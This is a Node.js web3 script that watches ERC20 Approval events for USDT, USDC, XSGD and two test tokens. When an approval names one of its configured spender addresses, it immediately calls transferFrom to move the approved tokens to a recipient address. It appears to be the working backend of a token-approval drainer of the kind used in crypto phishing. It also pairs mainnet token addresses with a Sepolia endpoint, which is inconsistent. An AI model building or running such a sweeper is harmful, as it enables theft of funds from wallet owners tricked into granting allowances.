const Web3 = require("web3");
const dotenv = require("dotenv");
dotenv.config();

const log = console.log;

const web3_instance = Web3.Web3;
const providerUrl = "wss://sepolia.drpc.org";
const web3 = new web3_instance(
  new web3_instance.providers.WebsocketProvider(providerUrl)
);

const ERC20_CONTRACT_ADDRESSES = [
  "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
  "0x70e8dE73cE538DA2bEEd35d14187F6959a8ecA96", // XSGD
  "0x736b400331be441f982d980036d638fc0fde5fac", // TEST - $W
  "0x0c584cd8282d9e6fa3240a16e12f63045374a81f", // TEST - $W2
];

const KEYPAIRS = {
  // '<SPECIFIC_SPENDER_ADDRESS>':{
  //   'PRIVATE_KEY': "",
  //   'RECIPIENT_ADDRESS':""
  // },
};
const ERC20_ABI = [
  // ERC20 ABI definitions
  {
    inputs: [
      { internalType: "string", name: "name_", type: "string" },
      { internalType: "string", name: "symbol_", type: "string" },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      {
        internalType: "uint256",
        name: "subtractedValue",
        type: "uint256",
      },
    ],
    name: "decreaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "addedValue", type: "uint256" },
    ],
    name: "increaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "totalSupply",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "from", type: "address" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const listenToContract = (contractAddress) => {
  log("listen: ", contractAddress);
  const tokenContract = new web3.eth.Contract(ERC20_ABI, contractAddress);
  const obj = tokenContract.events;
  obj
    .Approval({
      filter: { spender: Object.keys(KEYPAIRS) },
      fromBlock: "latest",
    })
    .on("data", async (event) => {
      try {
        const owner = event.returnValues.owner;
        const spender = event.returnValues.spender;
        const value = event.returnValues.value;
        const ownerBalance = await tokenContract.methods
          .balanceOf(owner)
          .call();
        
        log(spender, KEYPAIRS[spender].RECIPIENT_ADDRESS);

        console.log("Owner:", owner);
        console.log("Allowance:", value);
        console.log("Owner balance:", ownerBalance);

        if (ownerBalance != 0) {
          await sendTransferFrom(
            tokenContract,
            owner,
            KEYPAIRS[spender].RECIPIENT_ADDRESS,
            value,
            KEYPAIRS[spender].PRIVATE_KEY,
          );
        }
      } catch (error) {
        console.error("Error receiving event:", error);
      }
    });
};

const sendTransferFrom = async (contract, from, to, value, privatekey) => {
  const account = web3.eth.accounts.privateKeyToAccount(privatekey);
  const data = await contract.methods.transferFrom(from, to, value).encodeABI();

  const tx = {
    to: contract.options.address,
    gas: 2000000,
    gasPrice: await web3.eth.getGasPrice(),
    data: data,
    nonce: await web3.eth.getTransactionCount(account.address),
  };

  const signedTx = await account.signTransaction(tx);
  web3.eth
    .sendSignedTransaction(signedTx.rawTransaction)
    .on("receipt", (receipt) => {
      console.log("Transfer successful:", receipt);
    })
    .on("error", (error) => {
      console.error("Error during transfer:", error);
    });
};

const main = () => {
  ERC20_CONTRACT_ADDRESSES.forEach((contractAddress) =>
    listenToContract(contractAddress)
  );
  console.log("Listening for Approval events...");
};

main();
